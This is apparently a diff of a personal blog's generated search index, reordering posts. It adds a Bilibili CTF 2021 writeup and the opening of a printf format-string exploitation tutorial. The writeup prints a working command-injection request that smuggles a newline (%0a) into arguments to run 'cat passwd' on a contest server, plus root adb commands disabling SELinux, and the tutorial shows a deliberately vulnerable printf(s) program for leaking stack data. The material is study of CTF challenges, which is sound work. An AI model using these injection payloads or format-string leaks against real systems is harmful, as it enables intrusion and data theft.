@@ -569,6 +569,19 @@ alter table fingerprints drop partition p20
       </tags>
   </entry>
   <entry>
+    <title>Add tag system</title>
+    <url>/2019/05/20/2019-05-20-10-08-26/</url>
+    <content><![CDATA[<p>In May 20, 2019. I add a tag system into the blog.</p>
+<p>To use the tag, click add article or edit article, in the edit page, you will see  a new tag input.</p>
+<p>type tags into the input and split them with space</p>
+<p>e.g “mysql python” means two tag: mysql and python.</p>
+<p>click submit to finish.</p>
+]]></content>
+      <categories>
+        <category>SiteDev</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Use single-user-mode to access files from a mac without login</title>
     <url>/2019/05/26/2019-05-26-18-23-29/</url>
     <content><![CDATA[<p>On May 23, 2019. I accidentally drop my MacBook, which looses the connection between the motherboard and hard drive. After I reconnect the SATA cable and restart my computer, I found that my laptop stuck after I enter the login password.</p>
@@ -627,19 +640,6 @@ alter table fingerprints drop partition p20
         <tag>macos</tag>
         <tag>tutorial</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Add tag system</title>
-    <url>/2019/05/20/2019-05-20-10-08-26/</url>
-    <content><![CDATA[<p>In May 20, 2019. I add a tag system into the blog.</p>
-<p>To use the tag, click add article or edit article, in the edit page, you will see  a new tag input.</p>
-<p>type tags into the input and split them with space</p>
-<p>e.g “mysql python” means two tag: mysql and python.</p>
-<p>click submit to finish.</p>
-]]></content>
-      <categories>
-        <category>SiteDev</category>
-      </categories>
   </entry>
   <entry>
     <title>Landwave Word Test Cracking</title>
@@ -1337,17 +1337,6 @@ https://www.bsfdvbsbilibili.com
 ]]></content>
   </entry>
   <entry>
-    <title>Ubuntu20.04出现打不开terminal的情况 - no module named apt_pkg</title>
-    <url>/2021/08/28/ubuntu20-04-chu-xian-da-bu-kai-terminal-de-qing-kuang/</url>
-    <content><![CDATA[<p>打开ubuntu之后发现开不起terminal.</p>
-<p>然后firefox等其他应用正常打开。</p>
-<p>开ctrl+alt+f3进入命令行界面发现捏马的</p>
-<p><code>no module named apt_pkg</code></p>
-<p>突然想起来，关机之前把/usr/bin/python3的软链接把原来的python3.8改成python3.9了。。。</p>
-<p>所以把软连接改回python3.8再reboot就行了。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>Ubuntu设置自定义分辨率</title>
     <url>/2021/09/06/ubuntu-she-zhi-zi-ding-yi-fen-bian-lu/</url>
     <content><![CDATA[<p>步骤很简单</p>
@@ -1365,6 +1354,17 @@ https://www.bsfdvbsbilibili.com
         <tag>linux</tag>
         <tag>ubuntu</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu20.04出现打不开terminal的情况 - no module named apt_pkg</title>
+    <url>/2021/08/28/ubuntu20-04-chu-xian-da-bu-kai-terminal-de-qing-kuang/</url>
+    <content><![CDATA[<p>打开ubuntu之后发现开不起terminal.</p>
+<p>然后firefox等其他应用正常打开。</p>
+<p>开ctrl+alt+f3进入命令行界面发现捏马的</p>
+<p><code>no module named apt_pkg</code></p>
+<p>突然想起来，关机之前把/usr/bin/python3的软链接把原来的python3.8改成python3.9了。。。</p>
+<p>所以把软连接改回python3.8再reboot就行了。</p>
+]]></content>
   </entry>
   <entry>
     <title>Wired Python lambda scope (lambda closure)</title>
@@ -1498,6 +1498,69 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>bilibili ctf 2021 writeup</title>
+    <url>/2021/10/28/bilibili-ctf-2021/</url>
+    <content><![CDATA[<h1 id="0x0-简介"><a href="#0x0-简介" class="headerlink" title="0x0 简介"></a>0x0 简介</h1><p>Bilibili CTF 简称 BTF，是一个丝毫没有含金量的ctf，狗都不玩。</p>
+<p>你甚至可以纯复制粘贴来得到90分，属实拉垮。</p>
+<p>活动地址: <a href="https://www.bilibili.com/blackboard/20211024.html">https://www.bilibili.com/blackboard/20211024.html</a></p>
+<p>但是不管怎么样，我们来写一点可爱的writeup吧</p>
+<span id="more"></span>
+
+<h1 id="0x1-AES"><a href="#0x1-AES" class="headerlink" title="0x1 AES"></a>0x1 AES</h1><p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_224747.jpg" alt="2021-10-28_224747.jpg"></p>
+<p>猜一下，给了一个类似密码的东西，又给了一个类似加密后文本的字符串，那么就嗯破解就完事了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = &quot;e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364&quot;</span><br><span class="line">b = &quot;0408abca7deabb96a58f50471171b60e02b1a8dbd32db156&quot;</span><br><span class="line"># with open(&quot;a1&quot;,&quot;wb&quot;) as f:</span><br><span class="line">#     f.write(bytes.fromhex(b+a))</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">mode = AES.MODE_ECB</span><br><span class="line">cryptos = AES.new(b&quot;happy_1024_2233\x00&quot;, mode)</span><br><span class="line">plain_text = cryptos.decrypt(bytes.fromhex(a+b))</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure>
+
+<p>flag: a1cd5f84-27966146-3776f301-64031bb9</p>
+<h1 id="0x2-Forensic"><a href="#0x2-Forensic" class="headerlink" title="0x2 Forensic"></a>0x2 Forensic</h1><p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_225007.jpg" alt="2021-10-28_225007.jpg"></p>
+<p>提示给的很明白了，没有含金量，直接在webpack里一翻就翻到了</p>
+<p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_225125.jpg" alt="2021-10-28_225125.jpg"></p>
+<p>flag: 36c7a7b4-cda04af0-8db0368d-b5166480</p>
+<h1 id="0x3-php-web"><a href="#0x3-php-web" class="headerlink" title="0x3 php web"></a>0x3 php web</h1><p>题目给了一段php的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /* </span><br><span class="line">        bilibili- ( ゜- ゜)つロ 乾杯~</span><br><span class="line">        uat: http://192.168.3.2/uat/eval.php</span><br><span class="line">        pro: http://security.bilibili.com/sec1024/q/pro/eval.php</span><br><span class="line">    */</span><br><span class="line">    $args = @$_GET[&#x27;args&#x27;];</span><br><span class="line">    if (count($args) &gt;3) &#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    for ( $i=0; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        if ( !preg_match(&#x27;/^\w+$/&#x27;, $args[$i]) ) &#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // /bin/2233 args2 args3</span><br><span class="line">    // todo: other filter</span><br><span class="line">    $cmd = &quot;/bin/2233 &quot; . implode(&quot; &quot;, $args);</span><br><span class="line">    exec($cmd, $out);</span><br><span class="line">    for ($i=0; $i&lt;count($out); $i++)&#123;</span><br><span class="line">        echo($out[$i]);</span><br><span class="line">        echo(&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>通过正则可以知道，所有args必须为非空格的字母或者数字，且最大长度为3</p>
+<p>最后，这几个args会和/bin/2233 一起执行，执行的格式为 /bin/2233 args1 args2 args3</p>
+<p>但是我们想要使用ls, 所以args1 要带上一个换行符, 换行符在url encode 后是%0a,</p>
+<p>可以先用<code>args[]=1%0a&amp;args[]=ls</code>获取目录，然后用cat获取文件内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">a = requests.get(&quot;https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;args[]=cat&amp;args[]=passwd&quot;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure>
+<p>flag: 9d3c3014-6c6267e7-086aaee5-1f18452a</p>
+<h1 id="0x4-sql-injection"><a href="#0x4-sql-injection" class="headerlink" title="0x4 sql injection"></a>0x4 sql injection</h1><p>麻了</p>
+<p>flag: 3d5dd579-0678ef93-18b70cae-cabc5d51</p>
+<h1 id="0x5-安卓逆向"><a href="#0x5-安卓逆向" class="headerlink" title="0x5 安卓逆向"></a>0x5 安卓逆向</h1><p>先用dex2jar 把apk转成jar文件</p>
+<p>然后用jd-gui打开，在 MainActivity里找到账号密码的加密方式</p>
+<p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_230240.jpg" alt="2021-10-28_230240.jpg"></p>
+<p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_230317.jpg" alt="2021-10-28_230317.jpg"></p>
+<p>加密方式a为做异或，b为base64。反向解密一下就完事了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># dex2jar get jar file</span><br><span class="line"># jd gui decompile</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_a(s:bytes,paramInt:int):</span><br><span class="line">    bs = bytearray(s)</span><br><span class="line">    for i in range(len(bs)):</span><br><span class="line">        bs[i] = bs[i] ^ paramInt</span><br><span class="line">    return bytes(bs)</span><br><span class="line"></span><br><span class="line">def decrypt_b(s:bytes):</span><br><span class="line">    return base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encoded1 = [78, 106, 73, 49, 79, 122, 65, 51, 89, 71,</span><br><span class="line">                  65, 117, 78, 106, 78, 109, 78, 122, 99, 55,</span><br><span class="line">                  89, 109, 85, 61]</span><br><span class="line">encoded2 = [89, 87, 66, 108, 79, 109, 90, 110, 78, 106,</span><br><span class="line">                  65, 117, 79, 109, 74, 109, 78, 122, 65, 120,</span><br><span class="line">                  79, 50, 89, 61]</span><br><span class="line">print(decrypt_a(decrypt_b(bytes(encoded1)),3))</span><br><span class="line">print(decrypt_a(decrypt_b(bytes(encoded2)),3))</span><br><span class="line">print((decrypt_a(decrypt_b(bytes(encoded1)),3)+b&quot;-&quot;+decrypt_a(decrypt_b(bytes(encoded2)),3)).decode())</span><br></pre></td></tr></table></figure>
+
+<p>flag: 516834cc-50e448af-bcf9ed53-9ae4328e</p>
+<h1 id="0x6-安卓逆向-so文件"><a href="#0x6-安卓逆向-so文件" class="headerlink" title="0x6 安卓逆向 .so文件"></a>0x6 安卓逆向 .so文件</h1><p>ida打开MyLib.so文件，发现all函数</p>
+<p>满足一下条件:</p>
+<ol>
+<li>系统为x86且是安卓9<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;ro.product.cpu.abi&quot;,(3553400).to_bytes(0x8,&quot;little&quot;)) # x86</span><br><span class="line">print(&quot;ro.build.version.release&quot;,(57).to_bytes(0x8,&quot;little&quot;)) # 9</span><br></pre></td></tr></table></figure></li>
+<li>存在/data/2233 这个文件</li>
+<li>有读写权限</li>
+</ol>
+<p>那么这个flag就会写到/data/2233文件里</p>
+<p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_230949.jpg" alt="2021-10-28_230949.jpg"></p>
+<p>所以解题方法就是找一个安卓9, x86的系统，然后运行就完事了。</p>
+<p>具体过程如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># C:\Users\aynakeya&gt;adb shell su 0 setenforce 0</span><br><span class="line">#</span><br><span class="line"># C:\Users\aynakeya&gt;adb shell</span><br><span class="line"># 1|generic_x86:/ $ su</span><br><span class="line"># generic_x86:/ # echo &quot;123&quot; &gt; /data/2233</span><br><span class="line"># generic_x86:/ # su</span><br><span class="line"># generic_x86:/ # chmod 777 /data/</span><br><span class="line"># generic_x86:/ # chmod 77 /data/2233</span><br><span class="line"># generic_x86:/ # chmod 777 /data/2233</span><br><span class="line"># generic_x86:/ # chown everybody:everybody /data/2233</span><br><span class="line"># generic_x86:/ # chown everybody:everybody /data/</span><br><span class="line"># generic_x86:/ # cat /data/2233</span><br><span class="line"># 123</span><br><span class="line"># b1</span><br><span class="line"># 39</span><br><span class="line"># 81</span><br><span class="line"># f4</span><br><span class="line"># 5a</span><br><span class="line"># e9</span><br><span class="line"># 96</span><br><span class="line"># d4</span><br><span class="line"># bc</span><br><span class="line"># 04</span><br><span class="line"># be</span><br><span class="line"># 5b</span><br><span class="line"># 34</span><br><span class="line"># 66</span><br><span class="line"># 2a</span><br><span class="line"># 78</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>当然有dalao贴出了代码，我也不知道是怎么做到的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># from https://www.52pojie.cn/thread-1532604-2-1.html</span><br><span class="line">a = &#x27;bili_2233_3322&#x27;</span><br><span class="line">b = &#x27;bili_3322_2233&#x27;</span><br><span class="line">amd5 = hashlib.md5(a.encode()).digest()</span><br><span class="line">bmd5 = hashlib.md5(b.encode()).digest()</span><br><span class="line">for i in range(len(amd5)):</span><br><span class="line">    print(hex(amd5[i])[2:].zfill(2), end=&#x27;&#x27;)</span><br><span class="line">    print(hex(bmd5[i])[2:].zfill(2), end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>flag: b13981f4-5ae996d4-bc04be5b-34662a78</p>
+<h1 id="0x7-风控"><a href="#0x7-风控" class="headerlink" title="0x7 风控"></a>0x7 风控</h1><p>拿一半分的方法，大概就是筛去爬虫，然后取访问次数最多的几个ip，其他就不知道了。</p>
+<p>cr你隔这白嫖风控算法呐？</p>
+]]></content>
+      <tags>
+        <tag>bilibili</tag>
+        <tag>writeup</tag>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【Docker】用Docker构建一个前后端分离的项目 (go+vue)</title>
     <url>/2022/01/08/built-go-gin-backend-and-vue-spa-frontend-with-docker/</url>
     <content><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>最近给自己的一个后端项目<a href="https://github.com/aynakeya/AynaAPI">AynaAPI</a>做了一个前端。因为是用vue写的，而且使用了vue-router, 所以直接用go-gin渲染前端不太好用，而且也不太符合前后端分离的理念。</p>
@@ -1598,69 +1661,6 @@ https://www.bsfdvbsbilibili.com
         <tag>full stack</tag>
         <tag>go</tag>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bilibili ctf 2021 writeup</title>
-    <url>/2021/10/28/bilibili-ctf-2021/</url>
-    <content><![CDATA[<h1 id="0x0-简介"><a href="#0x0-简介" class="headerlink" title="0x0 简介"></a>0x0 简介</h1><p>Bilibili CTF 简称 BTF，是一个丝毫没有含金量的ctf，狗都不玩。</p>
-<p>你甚至可以纯复制粘贴来得到90分，属实拉垮。</p>
-<p>活动地址: <a href="https://www.bilibili.com/blackboard/20211024.html">https://www.bilibili.com/blackboard/20211024.html</a></p>
-<p>但是不管怎么样，我们来写一点可爱的writeup吧</p>
-<span id="more"></span>
-
-<h1 id="0x1-AES"><a href="#0x1-AES" class="headerlink" title="0x1 AES"></a>0x1 AES</h1><p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_224747.jpg" alt="2021-10-28_224747.jpg"></p>
-<p>猜一下，给了一个类似密码的东西，又给了一个类似加密后文本的字符串，那么就嗯破解就完事了</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = &quot;e9ca6f21583a1533d3ff4fd47ddc463c6a1c7d2cf084d364&quot;</span><br><span class="line">b = &quot;0408abca7deabb96a58f50471171b60e02b1a8dbd32db156&quot;</span><br><span class="line"># with open(&quot;a1&quot;,&quot;wb&quot;) as f:</span><br><span class="line">#     f.write(bytes.fromhex(b+a))</span><br><span class="line"></span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">mode = AES.MODE_ECB</span><br><span class="line">cryptos = AES.new(b&quot;happy_1024_2233\x00&quot;, mode)</span><br><span class="line">plain_text = cryptos.decrypt(bytes.fromhex(a+b))</span><br><span class="line">print(plain_text)</span><br></pre></td></tr></table></figure>
-
-<p>flag: a1cd5f84-27966146-3776f301-64031bb9</p>
-<h1 id="0x2-Forensic"><a href="#0x2-Forensic" class="headerlink" title="0x2 Forensic"></a>0x2 Forensic</h1><p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_225007.jpg" alt="2021-10-28_225007.jpg"></p>
-<p>提示给的很明白了，没有含金量，直接在webpack里一翻就翻到了</p>
-<p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_225125.jpg" alt="2021-10-28_225125.jpg"></p>
-<p>flag: 36c7a7b4-cda04af0-8db0368d-b5166480</p>
-<h1 id="0x3-php-web"><a href="#0x3-php-web" class="headerlink" title="0x3 php web"></a>0x3 php web</h1><p>题目给了一段php的代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /* </span><br><span class="line">        bilibili- ( ゜- ゜)つロ 乾杯~</span><br><span class="line">        uat: http://192.168.3.2/uat/eval.php</span><br><span class="line">        pro: http://security.bilibili.com/sec1024/q/pro/eval.php</span><br><span class="line">    */</span><br><span class="line">    $args = @$_GET[&#x27;args&#x27;];</span><br><span class="line">    if (count($args) &gt;3) &#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    for ( $i=0; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        if ( !preg_match(&#x27;/^\w+$/&#x27;, $args[$i]) ) &#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // /bin/2233 args2 args3</span><br><span class="line">    // todo: other filter</span><br><span class="line">    $cmd = &quot;/bin/2233 &quot; . implode(&quot; &quot;, $args);</span><br><span class="line">    exec($cmd, $out);</span><br><span class="line">    for ($i=0; $i&lt;count($out); $i++)&#123;</span><br><span class="line">        echo($out[$i]);</span><br><span class="line">        echo(&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通过正则可以知道，所有args必须为非空格的字母或者数字，且最大长度为3</p>
-<p>最后，这几个args会和/bin/2233 一起执行，执行的格式为 /bin/2233 args1 args2 args3</p>
-<p>但是我们想要使用ls, 所以args1 要带上一个换行符, 换行符在url encode 后是%0a,</p>
-<p>可以先用<code>args[]=1%0a&amp;args[]=ls</code>获取目录，然后用cat获取文件内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">a = requests.get(&quot;https://security.bilibili.com/sec1024/q/pro/eval.php?args[]=1%0a&amp;args[]=cat&amp;args[]=passwd&quot;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure>
-<p>flag: 9d3c3014-6c6267e7-086aaee5-1f18452a</p>
-<h1 id="0x4-sql-injection"><a href="#0x4-sql-injection" class="headerlink" title="0x4 sql injection"></a>0x4 sql injection</h1><p>麻了</p>
-<p>flag: 3d5dd579-0678ef93-18b70cae-cabc5d51</p>
-<h1 id="0x5-安卓逆向"><a href="#0x5-安卓逆向" class="headerlink" title="0x5 安卓逆向"></a>0x5 安卓逆向</h1><p>先用dex2jar 把apk转成jar文件</p>
-<p>然后用jd-gui打开，在 MainActivity里找到账号密码的加密方式</p>
-<p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_230240.jpg" alt="2021-10-28_230240.jpg"></p>
-<p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_230317.jpg" alt="2021-10-28_230317.jpg"></p>
-<p>加密方式a为做异或，b为base64。反向解密一下就完事了。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># dex2jar get jar file</span><br><span class="line"># jd gui decompile</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt_a(s:bytes,paramInt:int):</span><br><span class="line">    bs = bytearray(s)</span><br><span class="line">    for i in range(len(bs)):</span><br><span class="line">        bs[i] = bs[i] ^ paramInt</span><br><span class="line">    return bytes(bs)</span><br><span class="line"></span><br><span class="line">def decrypt_b(s:bytes):</span><br><span class="line">    return base64.b64decode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encoded1 = [78, 106, 73, 49, 79, 122, 65, 51, 89, 71,</span><br><span class="line">                  65, 117, 78, 106, 78, 109, 78, 122, 99, 55,</span><br><span class="line">                  89, 109, 85, 61]</span><br><span class="line">encoded2 = [89, 87, 66, 108, 79, 109, 90, 110, 78, 106,</span><br><span class="line">                  65, 117, 79, 109, 74, 109, 78, 122, 65, 120,</span><br><span class="line">                  79, 50, 89, 61]</span><br><span class="line">print(decrypt_a(decrypt_b(bytes(encoded1)),3))</span><br><span class="line">print(decrypt_a(decrypt_b(bytes(encoded2)),3))</span><br><span class="line">print((decrypt_a(decrypt_b(bytes(encoded1)),3)+b&quot;-&quot;+decrypt_a(decrypt_b(bytes(encoded2)),3)).decode())</span><br></pre></td></tr></table></figure>
-
-<p>flag: 516834cc-50e448af-bcf9ed53-9ae4328e</p>
-<h1 id="0x6-安卓逆向-so文件"><a href="#0x6-安卓逆向-so文件" class="headerlink" title="0x6 安卓逆向 .so文件"></a>0x6 安卓逆向 .so文件</h1><p>ida打开MyLib.so文件，发现all函数</p>
-<p>满足一下条件:</p>
-<ol>
-<li>系统为x86且是安卓9<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(&quot;ro.product.cpu.abi&quot;,(3553400).to_bytes(0x8,&quot;little&quot;)) # x86</span><br><span class="line">print(&quot;ro.build.version.release&quot;,(57).to_bytes(0x8,&quot;little&quot;)) # 9</span><br></pre></td></tr></table></figure></li>
-<li>存在/data/2233 这个文件</li>
-<li>有读写权限</li>
-</ol>
-<p>那么这个flag就会写到/data/2233文件里</p>
-<p><img src="/2021/10/28/bilibili-ctf-2021/2021-10-28_230949.jpg" alt="2021-10-28_230949.jpg"></p>
-<p>所以解题方法就是找一个安卓9, x86的系统，然后运行就完事了。</p>
-<p>具体过程如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># C:\Users\aynakeya&gt;adb shell su 0 setenforce 0</span><br><span class="line">#</span><br><span class="line"># C:\Users\aynakeya&gt;adb shell</span><br><span class="line"># 1|generic_x86:/ $ su</span><br><span class="line"># generic_x86:/ # echo &quot;123&quot; &gt; /data/2233</span><br><span class="line"># generic_x86:/ # su</span><br><span class="line"># generic_x86:/ # chmod 777 /data/</span><br><span class="line"># generic_x86:/ # chmod 77 /data/2233</span><br><span class="line"># generic_x86:/ # chmod 777 /data/2233</span><br><span class="line"># generic_x86:/ # chown everybody:everybody /data/2233</span><br><span class="line"># generic_x86:/ # chown everybody:everybody /data/</span><br><span class="line"># generic_x86:/ # cat /data/2233</span><br><span class="line"># 123</span><br><span class="line"># b1</span><br><span class="line"># 39</span><br><span class="line"># 81</span><br><span class="line"># f4</span><br><span class="line"># 5a</span><br><span class="line"># e9</span><br><span class="line"># 96</span><br><span class="line"># d4</span><br><span class="line"># bc</span><br><span class="line"># 04</span><br><span class="line"># be</span><br><span class="line"># 5b</span><br><span class="line"># 34</span><br><span class="line"># 66</span><br><span class="line"># 2a</span><br><span class="line"># 78</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>当然有dalao贴出了代码，我也不知道是怎么做到的。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># from https://www.52pojie.cn/thread-1532604-2-1.html</span><br><span class="line">a = &#x27;bili_2233_3322&#x27;</span><br><span class="line">b = &#x27;bili_3322_2233&#x27;</span><br><span class="line">amd5 = hashlib.md5(a.encode()).digest()</span><br><span class="line">bmd5 = hashlib.md5(b.encode()).digest()</span><br><span class="line">for i in range(len(amd5)):</span><br><span class="line">    print(hex(amd5[i])[2:].zfill(2), end=&#x27;&#x27;)</span><br><span class="line">    print(hex(bmd5[i])[2:].zfill(2), end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>flag: b13981f4-5ae996d4-bc04be5b-34662a78</p>
-<h1 id="0x7-风控"><a href="#0x7-风控" class="headerlink" title="0x7 风控"></a>0x7 风控</h1><p>拿一半分的方法，大概就是筛去爬虫，然后取访问次数最多的几个ip，其他就不知道了。</p>
-<p>cr你隔这白嫖风控算法呐？</p>
-]]></content>
-      <tags>
-        <tag>bilibili</tag>
-        <tag>writeup</tag>
-        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -2085,9 +2085,9 @@ https://www.bsfdvbsbilibili.com
 <h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h2><p>SECCON{M4k3_My_4bi1i7i3s_4v3r4g3_in_7h3_N3x7_Lif3_cpwWz9jpoCmKYBvf}</p>
 ]]></content>
       <tags>
-        <tag>web</tag>
         <tag>writeup</tag>
         <tag>ctf</tag>
+        <tag>web</tag>
         <tag>pwn</tag>
         <tag>misc</tag>
       </tags>
@@ -2414,6 +2414,146 @@ https://www.bsfdvbsbilibili.com
       </categories>
   </entry>
   <entry>
+    <title>[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022]</title>
+    <url>/2022/02/02/how-to-utilize-printf-in-pwn/</url>
+    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p><strong>printf</strong> is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think it would be good if I wrote my experience about printf so that I could reinforce my understanding about printf stuff.</p>
+<p>Anyway, I would try to explain as much as detail in the article in order to make it beginner friendly.</p>
+<p>Hope this article can help you in printf</p>
+<h1 id="0x1-What-is-printf-string-formating"><a href="#0x1-What-is-printf-string-formating" class="headerlink" title="0x1 What is printf (string formating)"></a>0x1 What is printf (string formating)</h1><p>so, string format is a way to print out data by stating its format in a string.</p>
+<span id="more"></span>
+
+<p>for example, the code below will print out <strong>“Hello, printf , I’m 16 year old”</strong>. We can see that string “%s” is replace by “printf” and “%d” is replaced by 0x10 (which is 16 in decimal)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;Hello, %s , I&#x27;m %d year old&quot;,&quot;printf&quot;,0x10)</span><br></pre></td></tr></table></figure>
+
+<p>all the character start with <strong>%</strong> is called <strong>format string</strong>, there are serveral different format string you can use in C.</p>
+<p>Here is some commonly used format string, ignore <code>%n</code> for now. We will come to it later</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%d      integer</span><br><span class="line">%s      char</span><br><span class="line">%l      long int</span><br><span class="line">%ll     long long int</span><br><span class="line">%p      pointer </span><br><span class="line">%x      unsigned hexadecimal</span><br><span class="line">%n      write number of printed character in 4 byte</span><br><span class="line">%hn     write number of printed character in 2 byte</span><br><span class="line">%hhn    write number of printed character in 1 byte</span><br><span class="line"></span><br><span class="line">%10$?   use 10th parameter and print in format of ?</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-How-function-are-called"><a href="#0x2-How-function-are-called" class="headerlink" title="0x2 How function are called"></a>0x2 How function are called</h1><p>Before talking about the printf, first thing we need to know is how a function are called and how parameter are passed.</p>
+<p>In one words, x86 push all parameter into the stack. x64 move first 6 parameter into register and push rest parameters in to the stack.</p>
+<p>for example</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bar(100,200)</span><br></pre></td></tr></table></figure>
+
+<p>In <strong>x86</strong>, the stack would look like this</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bar Stack (current)</span><br><span class="line">EBP</span><br><span class="line">EIP</span><br><span class="line">200 - para2</span><br><span class="line">100 - para1</span><br><span class="line">Pararent Stack</span><br></pre></td></tr></table></figure>
+
+<p>While in <strong>x64</strong>, the stack would look like this and two paramter, 100 is saved in the <code>rdi</code> and 200 is saved in the <code>rsi</code>. Since there there are only two argument, there is no extra value pushed into the stack.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bar Stack (current)</span><br><span class="line">RBP</span><br><span class="line">RIP</span><br><span class="line">Pararent Stack</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/02/02/how-to-utilize-printf-in-pwn/2022-02-02_192750.jpg" alt="2022-02-02_192750.jpg"></p>
+<h1 id="0x2-Read-the-stack"><a href="#0x2-Read-the-stack" class="headerlink" title="0x2 Read the stack"></a>0x2 Read the stack</h1><h2 id="basic-idea"><a href="#basic-idea" class="headerlink" title="basic idea"></a>basic idea</h2><p>Here is a simple vulnerable code, can you figure out a way to let program print out <code>*buf</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int x = 0x1337;</span><br><span class="line">  char *buf = &quot;my super secret&quot;;</span><br><span class="line">  char s[0x20];</span><br><span class="line">  printf(&quot;hello here is my number %d\n&quot;, x);</span><br><span class="line">  while (1)</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;please enter: &quot;);</span><br><span class="line">    fgets(s, 0x20, stdin);</span><br><span class="line">    puts(&quot;You Enter: &quot;);</span><br><span class="line">    printf(s); //!! here</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>printf(s)</code> give us the opportunity. As I mentioned in the Part1, the computer didn’t care about what parameter you actually pass in. It read whatever is in the register and on the stack.</p>
+<p>Assume you put <code>%p-%p-%p-%p</code> in the string <code>s</code>. The computer don’t know you didn’t pass other 4 parameter. It will just read whatever is store in the register and stack. </p>
+<p>For example ,in x64, it will print out address in <code>&quot;rsi-rdx-rcx-r8&quot;</code>.</p>
+<p>So, if we continue to print out, and used out all the 6 register. printf will assume there is some data in the stack, so printf will then get data from stack and print it out.</p>
+<p>This give us a way off leaking data on the stack.</p>
